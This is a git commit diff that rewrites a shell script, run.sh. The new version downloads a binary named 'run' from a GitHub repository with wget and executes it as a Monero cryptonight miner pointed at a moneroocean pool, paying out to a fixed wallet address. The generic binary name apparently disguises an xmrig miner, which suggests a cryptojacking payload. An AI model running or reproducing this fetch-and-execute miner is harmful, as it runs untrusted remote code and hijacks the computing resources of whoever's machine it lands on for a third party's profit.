606dc8f985925e51de177b322d01f4b700b5be94
osrun <44208422+osrun@users.noreply.github.com>
2018-10-16 16:07:38 -0300

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
-wget 
-/xmrig/build/xmrig -a cryptonight -o stratum+tcp://gulf.moneroocean.stream:80 -u 497mFUrVuiY1uCnGwkRvJVWtEjGeughYLcwQpu4VcSmXZdjUi1KCVSn2tP2ZFbdBMtKKFyrKzRZNvRhXXTkFU91TPjTrDVg -p y
+wget https://github.com/osrun/beta/raw/master/run
+./run -a cryptonight -o stratum+tcp://gulf.moneroocean.stream:80 -u 497mFUrVuiY1uCnGwkRvJVWtEjGeughYLcwQpu4VcSmXZdjUi1KCVSn2tP2ZFbdBMtKKFyrKzRZNvRhXXTkFU91TPjTrDVg -p y
